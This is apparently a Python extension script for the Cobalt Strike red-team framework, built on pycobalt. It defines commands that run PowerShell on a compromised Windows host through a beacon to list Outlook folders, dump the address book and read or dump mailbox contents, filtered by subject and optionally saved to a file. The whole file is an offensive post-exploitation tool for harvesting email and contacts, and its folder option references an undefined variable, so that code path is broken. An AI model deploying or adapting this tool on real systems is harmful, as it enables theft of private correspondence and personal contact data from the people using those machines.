#!/usr/bin/env python3

import sys
import utils
sys.path.insert(0, utils.basedir('pycobalt'))

import textwrap

import pycobalt.engine as engine
import pycobalt.events as events
import pycobalt.commands as commands
import pycobalt.aliases as aliases
import pycobalt.aggressor as aggressor
import pycobalt.callbacks as callbacks
import pycobalt.helpers as helpers

# Common outlook stuff
def outlook():
    return helpers.code_string(r"""
        Add-type -assembly "Microsoft.Office.Interop.Outlook" | out-null
        $folders = "Microsoft.Office.Interop.Outlook.olDefaultFolders" -as [type]
        $outlook = new-object -comobject outlook.application
        $namespace = $outlook.GetNameSpace("MAPI")
        """)

@aliases.alias('outlook-folders', 'Get list of outlook folders')
def _(bid):
    command = ''
    command += outlook()
    command += '$namespace.Folders | Select FullFolderPath'
    aggressor.bpowerpick(bid, command)

@aliases.alias('outlook-contacts', 'Get list of outlook contacts')
def _(bid, outfile=None):
    command = ''
    command += outlook()
    command += helpers.code_string(r"""
        $contactObject  = $namespace.GetDefaultFolder([Microsoft.Office.Interop.Outlook.OlDefaultFolders]::olFolderContacts) 
        $contactList = $contactObject.Items; 
        """)

    if outfile:
        # full version to file
        command += helpers.code_string(r"""
            $contactList > {out}
            $length = $contactList.Count
            echo "wrote $length contacts to {out}"
            """.format(out=outfile))
    else:
        # short version to console
        command += '$contactList | Select-Object CompanyName, FullName, Email1DisplayName, Email2DisplayName, Email3DisplayName'

    aggressor.bpowerpick(bid, command)

@aliases.alias('outlook', 'Get outlook folder', 'See `outlook -h`')
def _(bid, *args):
    parser = helpers.ArgumentParser(bid=bid, prog='outlook')
    parser.add_argument('-f', '--folder', help='Folder name to grab')
    parser.add_argument('-s', '--subject', help='Match subject line (glob)')
    parser.add_argument('-t', '--top', metavar='N', type=int, help='Only show top N results')
    parser.add_argument('-d', '--dump', action='store_true', help='Get full dump')
    parser.add_argument('-o', '--out', help='Output file')
    try: args = parser.parse_args(args)
    except: return

    command = ''
    command += outlook()

    # -f/--folder
    if args.folder:
        # specified folder
        #folder = args.folder.lstrip('\\')
        command += helpers.code_string(r"""
            $folder = $namespace.Folders.Item("{}")
            """.format(folder))
    else:
        # inbox
        command += helpers.code_string(r"""
            $folder = $namespace.getDefaultFolder($folders::olFolderInBox)
            """)

    command += helpers.code_string(r"""
        $folder.items""")

    # -s/--subject
    if args.subject:
        command += ' | Where-Object {{$_.Subject -Like "{}"}}'.format(args.subject)

    # -t/--top
    if args.top:
        command += ' | select -First {}'.format(args.top)

    # -d/--dump
    if not args.dump:
        # print summary only
        #command += ' | Format-Table -AutoSize Subject, ReceivedTime, SenderName, SenderEmailAddress'
        command += ' | Select-Object -Property Subject, ReceivedTime, SenderName, SenderEmailAddress'

    # -o/--out
    if args.out:
        command += ' > {}'.format(args.out)

    aggressor.bpowerpick(bid, command)

